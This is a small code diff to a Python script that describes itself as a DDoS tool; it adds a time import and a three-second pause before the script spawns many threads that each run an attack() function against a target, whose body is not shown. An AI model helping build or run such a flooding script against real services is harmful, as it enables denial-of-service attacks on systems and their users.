@@ -1,4 +1,4 @@
-import socket, threading, sys
+import socket, threading, sys, time
 from colorama import Fore
 
 try:
@@ -28,6 +28,7 @@ def attack():
 
 if __name__ == '__main__':
 	print(f"Starting to DDoS {Fore.RED}{target}{Fore.RESET}!")
+	time.sleep(3)
 	for i in range(count):
 		try:
 		    thread = threading.Thread(target=attack)
